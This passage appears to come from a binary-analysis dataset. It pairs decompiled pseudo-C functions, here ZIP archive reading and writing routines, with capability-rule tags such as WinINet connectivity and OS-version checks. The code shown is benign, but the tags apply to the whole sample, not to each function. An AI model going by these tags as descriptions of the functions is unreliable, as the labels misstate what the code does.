0) {\n                        if (*(iVar14 + 0x20) != uStack56) goto code_r0x0041ba02;\n                        pcVar10 = pcStack44 + *(iVar14 + 0x1e) + uVar9;\n                        if ((param_4 & 0x100) == 0) {\n                            uVar12 = 0;\n                            do {\n                                iVar4 = param_3[uVar12];\n                                if (param_3[uVar12] + 0xbfU < 0x1a) {\n                                    iVar4 = iVar4 + 0x20;\n                                }\n                                iVar5 = pcVar10[uVar12];\n                                if (pcVar10[uVar12] + 0xbfU < 0x1a) {\n                                    iVar5 = iVar5 + 0x20;\n                                }\n                                if (iVar4 != iVar5) goto code_r0x0041ba02;\n                                uVar12 = uVar12 + 1;\n                            } while (uVar12 != uStack56);\n                        }\n                        else {\n                            iVar4 = sub.msvcrt.dll_memcmp(param_3, pcVar10, uStack56);\n                            if (iVar4 != 0) goto code_r0x0041ba02;\n                        }\n                    }\n                    if (((param_4 & 0x200) != 0) && (uVar9 != 0)) {\n                        iVar4 = uVar9 - 1;\n                        do {\n                            cVar2 = *(iVar14 + 0x2e + iVar4);\n                            if ((cVar2 == '/' || cVar2 == '\\\\') || (cVar2 == ':')) break;\n                            iVar4 = iVar4 + -1;\n                        } while (iVar4 != -1);\n                        pcStack44 = pcStack44 + iVar4 + 1;\n                        uVar9 = uVar9 - (iVar4 + 1);\n                    }\n                    if (uVar9 == uVar8) {\n                        if ((param_4 & 0x100) == 0) {\n                            pcVar10 = pcStack44 + uVar8;\n                            puVar6 = param_2;\n                            do {\n                                if (pcVar10 == pcStack44) {\n                                    return iStack48;\n                                }\n                                iVar14 = *puVar6;\n                                if (*puVar6 + 0xbf < 0x1a) {\n                                    iVar14 = iVar14 + 0x20;\n                                }\n                                iVar4 = *pcStack44;\n                                if (*pcStack44 + 0xbfU < 0x1a) {\n                                    iVar4 = iVar4 + 0x20;\n                                }\n                                pcStack44 = pcStack44 + 1;\n                                puVar6 = puVar6 + 1;\n                            } while (iVar14 == iVar4);\n                        }\n                        else {\n                            iVar14 = sub.msvcrt.dll_memcmp(param_2, pcStack44, uVar8);\n                            if (iVar14 == 0) {\n                                return iStack48;\n                            }\n                        }\n                    }\n                }\ncode_r0x0041ba02:\n            }\n        }\n    }\n    return -1;\n}\n",
        "token_count": 1856
    },
    "0041c416": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.0041c416(int32_t param_1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *puVar4;\n    \n    uVar3 = 0;\n    if ((((param_1 != 0) && (puVar1 = *(param_1 + 0x48),  puVar1 != NULL)) && (*(param_1 + 0x28) != 0)) &&\n       ((*(param_1 + 0x2c) != NULL && (*(param_1 + 0x14) == 1)))) {\n        uVar3 = *puVar1;\n        *(param_1 + 0x48) = 0;\n        (**(param_1 + 0x2c))(*(param_1 + 0x34), uVar3);\n        puVar4 = puVar1;\n        for (iVar2 = 4; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar4 = 0;\n            puVar4 = puVar4 + 1;\n        }\n        (**(param_1 + 0x2c))(*(param_1 + 0x34), puVar1[4]);\n        puVar4 = puVar1 + 4;\n        for (iVar2 = 4; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar4 = 0;\n            puVar4 = puVar4 + 1;\n        }\n        (**(param_1 + 0x2c))(*(param_1 + 0x34), puVar1[8]);\n        puVar4 = puVar1 + 8;\n        for (iVar2 = 4; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar4 = 0;\n            puVar4 = puVar4 + 1;\n        }\n        if (puVar1[0xf] != 0) {\n            sub.msvcrt.dll_fclose(puVar1[0xf]);\n            puVar1[0xf] = 0;\n        }\n        uVar3 = 1;\n        (**(param_1 + 0x2c))(*(param_1 + 0x34), puVar1);\n        *(param_1 + 0x14) = 0;\n    }\n    return uVar3;\n}\n",
        "token_count": 524
    },
    "0041c6a3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.0041c6a3(uint *param_1, uint param_2, uint param_3)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    \n    if ((((param_1 != NULL) && (param_1[0x12] == 0)) && (param_1[0xf] != 0)) && (param_1[5] == 0)) {\n        uVar1 = param_1[9];\n        uVar2 = param_1[8];\n        if (((uVar1 | uVar2) == 0) || ((uVar1 & (uVar1 - 1) + (uVar2 != 0) | uVar2 & uVar2 - 1) == 0)) {\n            if (param_1[10] == 0) {\n                param_1[10] = 0x414964;\n            }\n            if (param_1[0xb] == 0) {\n                param_1[0xb] = 0x414957;\n            }\n            if (param_1[0xc] == 0) {\n                param_1[0xc] = 0x41505f;\n            }\n            param_1[5] = 2;\n            param_1[2] = 0;\n            param_1[3] = 0;\n            param_1[4] = 0;\n            *param_1 = param_2;\n            param_1[1] = param_3;\n            puVar3 = (*param_1[10])(param_1[0xd], 1, 0x58);\n            param_1[0x12] = puVar3;\n            if (puVar3 != NULL) {\n                for (iVar4 = 0x16; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar3 = 0;\n                    puVar3 = puVar3 + 1;\n                }\n                iVar4 = param_1[0x12];\n                *(iVar4 + 0xc) = 1;\n                *(iVar4 + 0x1c) = 4;\n                *(iVar4 + 0x2c) = 4;\n                return 1;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 519
    },
    "0041c79d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0041c79d(uint32_t *param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    \n    if (param_1 == NULL) {\n        return 0;\n    }\n    uVar1 = param_1[0x12];\n    if (uVar1 == 0) {\n        return 0;\n    }\n    if (param_1[5] != 1) {\n        return 0;\n    }\n    if (param_1[4] != 0xffff) {\n        if (param_1[1] + (0xffffffb3 < *param_1) != 0) {\n            return 0;\n        }\n        iVar3 = *(uVar1 + 0x3c);\n        if (iVar3 == 0) {\n            if (*(uVar1 + 0x48) == 0) {\n                if (param_1[0xf] == 0) {\n                    return 0;\n                }\n            }\n            else {\n                if (param_1 != param_1[0x11]) {\n                    return 0;\n                }\n                *(uVar1 + 0x50) = *(uVar1 + 0x4c);\n                param_1[0xf] = fcn.00414f30;\n            }\n        }\n        else {\n            if ((param_1[0x11] != param_1) || (param_2 == 0)) {\n                return 0;\n            }\n            param_1[0xf] = fcn.00416245;\n            iVar3 = sub.msvcrt.dll_freopen(param_2, 0x424986, iVar3);\n            *(uVar1 + 0x3c) = iVar3;\n            if (iVar3 == 0) {\n                fcn.0041c416(param_1);\n                return 0;\n            }\n        }\n        uVar1 = param_1[2];\n        uVar2 = param_1[3];\n        param_1[5] = 2;\n        param_1[2] = 0;\n        param_1[3] = 0;\n        *param_1 = uVar1;\n        param_1[1] = uVar2;\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 516
    },
    "0041dd3f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.0041dd3f(uint32_t *param_1)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uchar *puVar6;\n    uint var_4h;\n    uint var_10h;\n    uint var_14h;\n    uint var_44h;\n    uint var_48h;\n    uchar auStack50 [8];\n    uchar uStack42;\n    uchar uStack41;\n    uchar uStack40;\n    uchar uStack39;\n    \n    if ((((param_1 != NULL) && (puVar1 = param_1[0x12],  puVar1 != NULL)) && (param_1[5] == 2)) &&\n       (param_1[4] < 0x10000)) {\n        uVar4 = param_1[1];\n        uVar2 = *param_1;\n        uVar3 = puVar1[1];\n        if (uVar4 + (0xffffffe9 < uVar2) + CARRY4(uVar2 + 0x16, uVar3) == 0) {\n            if (param_1[4] != 0) {\n                param_1[2] = uVar2;\n                param_1[3] = uVar4;\n                uVar4 = (*param_1[0xf])(param_1[0x11], uVar2, uVar4, *puVar1, uVar3);\n                if (uVar3 != uVar4) {\n                    return 0;\n                }\n                uVar4 = *param_1;\n                *param_1 = *param_1 + uVar3;\n                param_1[1] = param_1[1] + CARRY4(uVar4, uVar3);\n            }\n            puVar6 = auStack50;\n            for (iVar5 = 0x16; iVar5 != 0; iVar5 = iVar5 + -1) {\n                *puVar6 = 0;\n                puVar6 = puVar6 + 1;\n            }\n            auStack50[0] = 0x50;\n            auStack50[1] = 0x4b;\n            auStack50[2] = 5;\n            auStack50[3] = 6;\n            uStack42 = param_1[4];\n            uStack41 = param_1[4] >> 8;\n            uStack40 = uStack42;\n            uStack39 = uStack41;\n            fcn.00414900();\n            fcn.00414900();\n            iVar5 = (*param_1[0xf])(param_1[0x11], *param_1, param_1[1], auStack50, 0x16);\n            if ((iVar5 == 0x16) && ((puVar1[0xf] == 0 || (iVar5 = sub.msvcrt.dll_fflush(puVar1[0xf]),  iVar5 != -1)))) {\n                uVar4 = *param_1;\n                *param_1 = *param_1 + 0x16;\n                param_1[5] = 3;\n                param_1[1] = param_1[1] + (0xffffffe9 < uVar4);\n                return 1;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 748
    },
    "0041df49": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.0041df49(int32_t param_1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *puVar4;\n    \n    uVar3 = 0;\n    if ((((param_1 != 0) && (puVar1 = *(param_1 + 0x48),  puVar1 != NULL)) && (*(param_1 + 0x28) != 0)) &&\n       ((*(param_1 + 0x2c) != NULL && (*(param_1 + 0x14) - 2U < 2)))) {\n        uVar3 = *puVar1;\n        *(param_1 + 0x48) = 0;\n        (**(param_1 + 0x2c))(*(param_1 + 0x34), uVar3);\n        puVar4 = puVar1;\n        for (iVar2 = 4; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar4 = 0;\n            puVar4 = puVar4 + 1;\n        }\n        (**(param_1 + 0x2c))(*(param_1 + 0x34), puVar1[4]);\n        puVar4 = puVar1 + 4;\n        for (iVar2 = 4; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar4 = 0;\n            puVar4 = puVar4 + 1;\n        }\n        (**(param_1 + 0x2c))(*(param_1 + 0x34), puVar1[8]);\n        puVar4 = puVar1 + 8;\n        for (iVar2 = 4; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar4 = 0;\n            puVar4 = puVar4 + 1;\n        }\n        if (puVar1[0xf] != 0) {\n            sub.msvcrt.dll_fclose(puVar1[0xf]);\n            puVar1[0xf] = 0;\n        }\n        if ((*(param_1 + 0x3c) == fcn.00414f30) && (puVar1[0x12] != 0)) {\n            (**(param_1 + 0x2c))(*(param_1 + 0x34), puVar1[0x12]);\n            puVar1[0x12] = 0;\n        }\n        uVar3 = 1;\n        (**(param_1 + 0x2c))(*(param_1 + 0x34), puVar1);\n        *(param_1 + 0x14) = 0;\n    }\n    return uVar3;\n}\n",
        "token_count": 612
    },
    "0041e16f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t fcn.0041e16f(int32_t param_1, uint param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    uint32_t *puVar1;\n    uint uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint extraout_ECX;\n    uint *puVar7;\n    uint32_t uVar8;\n    int32_t *piVar9;\n    int32_t iVar11;\n    uint *puVar12;\n    uint32_t uVar13;\n    bool bVar14;\n    ulong uVar15;\n    int32_t iStack20;\n    uint *puVar10;\n    \n    uVar13 = param_4;\n    uVar8 = param_3;\n    *(param_1 + 0x3c) = fcn.00416245;\n    *(param_1 + 0x44) = param_1;\n    iVar6 = fcn.0041c6a3(param_1, param_3, param_4);\n    if (iVar6 != 0) {\n        iVar6 = sub.msvcrt.dll_fopen(param_2, 0x424980);\n        if (iVar6 == 0) {\n            fcn.0041df49(param_1);\n            iVar6 = 0;\n        }\n        else {\n            *(*(param_1 + 0x48) + 0x3c) = iVar6;\n            iVar6 = 1;\n            if ((uVar13 | uVar8) != 0) {\n                iStack20 = param_1;\n                uVar15 = fcn.0041f3f0();\n                iVar4 = iStack20;\n                uVar8 = 0;\n                iVar11 = 0;\n                iVar6 = -uVar15;\n                piVar9 = &stack0xffffffec + iVar6;\n                *(&stack0x0000000c + iVar6) = uVar15 >> 0x20;\n                puVar7 = &stack0x0000001c + iVar6;\n                *(&stack0x00000010 + iVar6) = extraout_ECX;\n                puVar12 = puVar7;\n                for (iVar6 = 0x400; iVar6 != 0; iVar6 = iVar6 + -1) {\n                    *puVar12 = 0;\n                    puVar12 = puVar12 + 1;\n                }\n                while( true ) {\n                    if ((piVar9[9] == 0) && (piVar9[8] < 0x1001)) {\n                        uVar13 = piVar9[8];\n                    }\n                    else {\n                        uVar13 = 0x1000;\n                    }\n                    piVar9[3] = puVar7;\n                    piVar9[4] = uVar13;\n                    piVar9[1] = uVar8;\n                    piVar9[2] = iVar11;\n                    uVar2 = *(iVar4 + 0x44);\n                    piVar9[0xb] = puVar7;\n                    *piVar9 = uVar2;\n                    pcVar3 = *(iVar4 + 0x3c);\n                    puVar10 = piVar9 + -1;\n                    piVar9 = piVar9 + -1;\n                    *puVar10 = 0x41e133;\n                    uVar5 = (*pcVar3)();\n                    puVar7 = piVar9[0xb];\n                    if (uVar13 != uVar5) break;\n                    bVar14 = CARRY4(uVar8, uVar13);\n                    uVar8 = uVar8 + uVar13;\n                    iVar11 = iVar11 + bVar14;\n                    puVar1 = piVar9 + 8;\n                    uVar5 = *puVar1;\n                    *puVar1 = *puVar1 - uVar13;\n                    piVar9[9] = piVar9[9] - (uVar5 < uVar13);\n                    if ((piVar9[9] | piVar9[8]) == 0) {\n                        return 1;\n                    }\n                }\n                *piVar9 = iVar4;\n                piVar9[-1] = 0x41e143;\n                fcn.0041df49();\n                return 0;\n            }\n        }\n    }\n    return iVar6;\n}\n",
        "token_count": 986
    },
    "0041e44c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.0041e44c(char *param_1, uint32_t param_2, char param_3)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if (param_1 == NULL) {\n        return 0;\n    }\n    if (*param_1 == '\\0') {\n        return 0;\n    }\n    if (param_2 < 0) {\n        param_2 = 6;\n    }\n    if (10 < (param_2 & 0xf)) {\n        return 0;\n    }\n    iVar1 = sub.msvcrt.dll_malloc(1);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    *(iVar1 + 0x50) = param_2;\n    if (param_3 != 'r') {\n        if (param_3 == 'w') {\n            iVar2 = fcn.0041e16f(iVar1, param_1, 0, 0);\n            if (iVar2 != 0) {\n                return iVar1;\n            }\n            goto code_r0x0041e50d;\n        }\n        if (param_3 != 'a') goto code_r0x0041e50d;\n    }\n    iVar2 = fcn.0041c5a7(iVar1, param_1, param_2 | 0x800);\n    if (iVar2 != 0) {\n        if (param_3 != 'a') {\n            return iVar1;\n        }\n        iVar2 = fcn.0041c79d(iVar1, param_1);\n        if (iVar2 != 0) {\n            return iVar1;\n        }\n        fcn.0041c416(iVar1);\n    }\ncode_r0x0041e50d:\n    sub.msvcrt.dll_free(iVar1);\n    return 0;\n}\n",
        "token_count": 407
    },
    "0041e557": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0041e557(uint32_t *param_1, char *param_2)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t *puVar8;\n    bool bVar9;\n    uint uVar10;\n    uint in_stack_fffffd74;\n    uint in_stack_fffffd78;\n    uint in_stack_fffffd7c;\n    uint in_stack_fffffd80;\n    uint in_stack_fffffd84;\n    uint in_stack_fffffd88;\n    uint in_stack_fffffd8c;\n    uint in_stack_fffffd90;\n    uint32_t uVar11;\n    uint32_t in_stack_fffffd94;\n    uint in_stack_fffffd98;\n    uint32_t uVar12;\n    uint in_stack_fffffda0;\n    uint in_stack_fffffda4;\n    uint32_t in_stack_fffffda8;\n    uint in_stack_fffffdac;\n    uint in_stack_fffffdb0;\n    uint32_t in_stack_fffffdb4;\n    uint32_t in_stack_fffffdb8;\n    uint32_t in_stack_fffffdbc;\n    uint32_t in_stack_fffffdc0;\n    uint32_t in_stack_fffffdc4;\n    uint32_t in_stack_fffffdc8;\n    uint in_stack_fffffdcc;\n    uint32_t in_stack_fffffdd0;\n    uint32_t in_stack_fffffdd4;\n    uint32_t in_stack_fffffdd8;\n    uint in_stack_fffffddc;\n    uint in_stack_fffffde0;\n    uint in_stack_fffffde4;\n    uint in_stack_fffffde8;\n    uint in_stack_fffffdec;\n    uint in_stack_fffffdf0;\n    uint in_stack_fffffdf4;\n    uint in_stack_fffffdf8;\n    uint in_stack_fffffdfc;\n    uint in_stack_fffffe00;\n    uint in_stack_fffffe04;\n    uint in_stack_fffffe08;\n    uint in_stack_fffffe0c;\n    uint in_stack_fffffe10;\n    uint in_stack_fffffe14;\n    uint in_stack_fffffe18;\n    uint in_stack_fffffe1c;\n    uint in_stack_fffffe20;\n    uint in_stack_fffffe24;\n    uint in_stack_fffffe28;\n    uint in_stack_fffffe2c;\n    uint in_stack_fffffe30;\n    uint in_stack_fffffe34;\n    uint in_stack_fffffe38;\n    uint in_stack_fffffe3c;\n    uint in_stack_fffffe40;\n    uint in_stack_fffffe44;\n    uint in_stack_fffffe48;\n    uint in_stack_fffffe4c;\n    uint in_stack_fffffe50;\n    uint in_stack_fffffe54;\n    uint in_stack_fffffe58;\n    uint in_stack_fffffe5c;\n    uint in_stack_fffffe60;\n    uint in_stack_fffffe64;\n    uint in_stack_fffffe68;\n    uint in_stack_fffffe6c;\n    uint in_stack_fffffe70;\n    uint in_stack_fffffe74;\n    uint in_stack_fffffe78;\n    uint in_stack_fffffe7c;\n    uint in_stack_fffffe80;\n    uint in_stack_fffffe84;\n    uint in_stack_fffffe88;\n    uint in_stack_fffffe8c;\n    uint in_stack_fffffe90;\n    uint in_stack_fffffe94;\n    uint in_stack_fffffe98;\n    uint in_stack_fffffe9c;\n    \n    if (param_1 == NULL) {\n        return 0xffffffff;\n    }\n    bVar9 = param_2 == NULL;\n    uVar4 = in_stack_fffffd94 & 0xffffff00 | bVar9;\n    if (bVar9) {\n        return 0xffffffff;\n    }\n    uVar6 = 0xffffffff;\n    do {\n        if (uVar6 == 0) break;\n        uVar6 = uVar6 - 1;\n        cVar1 = *param_2;\n        param_2 = param_2 + 1;\n    } while (bVar9 != cVar1);\n    uVar6 = ~uVar6 - 1;\n    if (uVar6 == 0) {\n        return 0xffffffff;\n    }\n    uVar2 = fcn.004162d5();\n    param_1[0x17] = uVar2;\n    if (uVar2 == 0) {\n        return 0xffffffff;\n    }\n    uVar12 = param_1[5];\n    if (uVar12 == 1) {\n        uVar10 = 0;\n        uVar2 = fcn.0041b6f9(param_1, uVar2, 0);\n        param_1[0x16] = uVar2;\n        if ((-1 < uVar2) &&\n           (iVar3 = fcn.0041b06a(param_1, uVar2, &stack0xfffffda4, uVar10, in_stack_fffffd74, in_stack_fffffd78, \n                                 in_stack_fffffd7c, in_stack_fffffd80, in_stack_fffffd84, in_stack_fffffd88, \n                                 in_stack_fffffd8c, in_stack_fffffd90, uVar4, in_stack_fffffd98, uVar6, \n                                 in_stack_fffffda0, in_stack_fffffda4, in_stack_fffffda8, in_stack_fffffdac, \n                                 in_stack_fffffdb0, in_stack_fffffdb4, in_stack_fffffdb8, in_stack_fffffdbc, \n                                 in_stack_fffffdc0, in_stack_fffffdc4, in_stack_fffffdc8, in_stack_fffffdcc, \n                                 in_stack_fffffdd0, in_stack_fffffdd4, in_stack_fffffdd8, in_stack_fffffddc, \n                                 in_stack_fffffde0, in_stack_fffffde4, in_stack_fffffde8, in_stack_fffffdec, \n                                 in_stack_fffffdf0, in_stack_fffffdf4, in_stack_fffffdf8, in_stack_fffffdfc, \n                                 in_stack_fffffe00, in_stack_fffffe04, in_stack_fffffe08, in_stack_fffffe0c, \n                                 in_stack_fffffe10, in_stack_fffffe14, in_stack_fffffe18, in_stack_fffffe1c, \n                                 in_stack_fffffe20, in_stack_fffffe24, in_stack_fffffe28, in_stack_fffffe2c, \n                                 in_stack_fffffe30, in_stack_fffffe34, in_stack_fffffe38, in_stack_fffffe3c, \n                                 in_stack_fffffe40, in_stack_fffffe44, in_stack_fffffe48, in_stack_fffffe4c, \n                                 in_stack_fffffe50, in_stack_fffffe54, in_stack_fffffe58, in_stack_fffffe5c, \n                                 in_stack_fffffe60, in_stack_fffffe64, in_stack_fffffe68, in_stack_fffffe6c, \n                                 in_stack_fffffe70, in_stack_fffffe74, in_stack_fffffe78, in_stack_fffffe7c, \n                                 in_stack_fffffe80, in_stack_fffffe84, in_stack_fffffe88, in_stack_fffffe8c, \n                                 in_stack_fffffe90, in_stack_fffffe94, in_stack_fffffe98, in_stack_fffffe9c), \n           iVar3 != 0)) {\n            param_1[0x1f] = 0;\n            param_1[0x1a] = in_stack_fffffdbc;\n            param_1[0x1b] = in_stack_fffffdc0;\n            param_1[0x18] = in_stack_fffffdc4;\n            param_1[0x19] = in_stack_fffffdc8;\n            param_1[0x1c] = in_stack_fffffdb8;\n            param_1[0x29] = in_stack_fffffdd8;\n            param_1[0x1e] = in_stack_fffffda8;\n            param_1[0x28] = in_stack_fffffdd4;\n            *(param_1 + 0x2a) = in_stack_fffffdb0 >> 0x10;\n            param_1[0x13802] = in_stack_fffffdd0;\ncode_r0x0041e815:\n            param_1[0x13803] = in_stack_fffffdb4;\n            return 0;\n        }\n    }\n    else {\n        uVar2 = *param_1;\n        uVar11 = param_1[1];\n        uVar7 = param_1[4];\n        param_1[0x1a] = 0;\n        param_1[0x1b] = 0;\n        param_1[0x18] = 0;\n        param_1[0x1e] = uVar2;\n        param_1[0x1f] = uVar11;\n        param_1[0x28] = uVar2;\n        param_1[0x29] = uVar11;\n        param_1[0x16] = uVar7;\n        param_1[0x19] = 0;\n        param_1[0x1c] = 0;\n        puVar8 = param_1 + 0x20;\n        for (iVar3 = 0x1e; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar8 = uVar4;\n            puVar8 = puVar8 + 1;\n        }\n        *(param_1 + 0x2a) = 0;\n        param_1[0x13802] = 0;\n        uVar4 = fcn.0041493a();\n        if ((((param_1[0x12] != 0) && (uVar12 == 2)) && ((*(param_1 + 0x51) & 4) == 0)) &&\n           ((uVar7 != 0xffff &&\n            (iVar3 = 0, \n            uVar11 + (0xffffffb3 < uVar2) + CARRY4(uVar2 + 0x4c, uVar6) + CARRY4(uVar2 + 0x4c + uVar6, uVar4) == 0)))) {\n            uVar2 = uVar4 + 0x1e;\n            uVar12 = uVar6;\n            iVar5 = fcn.00414dc1(uVar2);\n            if (iVar5 != 0) {\n                uVar7 = uVar4 + param_1[0x28];\n                uVar11 = param_1[8];\n                uVar4 = param_1[0x29] + CARRY4(uVar4, param_1[0x28]);\n                param_1[0x28] = uVar7;\n                param_1[0x29] = uVar4;\n                if (((param_1[9] | uVar11) != 0) &&\n                   (((param_1[9] - 1) + (uVar11 != 0) & uVar4 | uVar11 - 1 & uVar7) != 0)) {\n                    sub.msvcrt.dll__assert\n                              (\"(zip->entry.header_offset & (pzip->m_file_offset_alignment - 1)) == 0\", 0x4249cc, 0x147)\n                    ;\n                }\n                uVar4 = uVar2 + param_1[0x1e];\n                uVar2 = param_1[0x1f] + CARRY4(uVar2, param_1[0x1e]);\n                param_1[0x1e] = uVar4;\n                param_1[0x1f] = uVar2;\n                uVar4 = (*param_1[0xf])(param_1[0x11], uVar4, uVar2, param_1[0x17], uVar12);\n                if (uVar12 == uVar4) {\n                    uVar4 = uVar6 + param_1[0x1e];\n                    uVar6 = iVar3 + param_1[0x1f] + CARRY4(uVar6, param_1[0x1e]);\n                    param_1[0x1e] = uVar4;\n                    param_1[0x1f] = uVar6;\n                    if ((param_1[0x14] & 0xf) != 0) {\n                        param_1[0x2f] = uVar6;\n                        param_1[0x2c] = param_1;\n                        param_1[0x2e] = uVar4;\n                        param_1[0x30] = 0;\n                        param_1[0x31] = 0;\n                        uVar10 = fcn.0041a99e(param_1[0x14] & 0xf, 0xfffffff1, 0);\n                        iVar3 = fcn.0041a64c(param_1 + 0x32, 0x416018, param_1 + 0x2c, uVar10);\n                        if (iVar3 != 0) goto code_r0x0041e885;\n                    }\n                    in_stack_fffffdb4 = sub.msvcrt.dll_time(0);\n                    goto code_r0x0041e815;\n                }\n            }\n        }\n    }\ncode_r0x0041e885:\n    if (param_1[0x17] != 0) {\n        sub.msvcrt.dll_free(param_1[0x17]);\n        param_1[0x17] = 0;\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 3128
    },
    "0041e988": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0041e988(uint *param_1)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    char *pcVar5;\n    uint *puVar6;\n    uchar uStack56;\n    uint uStack32;\n    \n    if (param_1 == NULL) {\n        return 0xffffffff;\n    }\n    uVar4 = 0;\n    if (param_1[5] == 1) goto code_r0x0041ebf4;\n    if ((*(param_1 + 0x14) & 0xf) == 0) {\ncode_r0x0041ea13:\n        uVar2 = 0xffffffff;\n        pcVar5 = param_1[0x17];\n        do {\n            if (uVar2 == 0) break;\n            uVar2 = uVar2 - 1;\n            cVar1 = *pcVar5;\n            pcVar5 = pcVar5 + 1;\n        } while (cVar1 != '\\0');\n        if ((param_1[0x1b] == 0) && (param_1[0x1f] == 0)) {\n            fcn.00415fc6();\n            uVar4 = param_1[0x2a];\n            puVar6 = param_1 + 0x20;\n            for (iVar3 = 0x1e; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar6 = 0;\n                puVar6 = puVar6 + 1;\n            }\n            *(param_1 + 0x20) = 0x50;\n            *(param_1 + 0x81) = 0x4b;\n            *(param_1 + 0x82) = 3;\n            *(param_1 + 0x83) = 4;\n            *(param_1 + 0x21) = ~-(uVar4 == 0) & 0x14;\n            *(param_1 + 0x22) = uVar4;\n            *(param_1 + 0x89) = uVar4 >> 8;\n            *(param_1 + 0x8a) = uStack32;\n            *(param_1 + 0x8b) = uStack32 >> 8;\n            *(param_1 + 0x23) = uStack32._2_1_;\n            *(param_1 + 0x8d) = uStack32 >> 0x18;\n            fcn.00414900();\n            fcn.00414900();\n            fcn.00414900();\n            uStack56 = ~uVar2 - 1;\n            *(param_1 + 0x27) = 0;\n            *(param_1 + 0x9d) = 0;\n            *(param_1 + 0x9a) = uStack56;\n            *(param_1 + 0x9b) = ~uVar2 - 1 >> 8;\n            iVar3 = (*param_1[0xf])(param_1[0x11], param_1[0x28], param_1[0x29], param_1 + 0x20, 0x1e);\n            if ((iVar3 == 0x1e) &&\n               (iVar3 = fcn.00416311(0x424a48, 0, param_1[0x18], param_1[0x19], param_1[0x1a], param_1[0x1b], \n                                     param_1[0x1c], *(param_1 + 0x2a), uStack32 & 0xffff, uStack32 >> 0x10, \n                                     param_1[0x28], param_1[0x29], param_1[0x13802]),  iVar3 != 0)) {\n                uVar4 = 0;\n                param_1[4] = param_1[4] + 1;\n                *param_1 = param_1[0x1e];\n                param_1[1] = param_1[0x1f];\n                goto code_r0x0041ebf4;\n            }\n        }\n    }\n    else {\n        uVar2 = fcn.0041a5f0(param_1 + 0x32, 0x424a48, 0, 4);\n        if (uVar2 < 2) {\n            *(param_1 + 0x2a) = 8;\n            param_1[0x1a] = param_1[0x30];\n            param_1[0x1b] = param_1[0x31];\n            param_1[0x1e] = param_1[0x2e];\n            param_1[0x1f] = 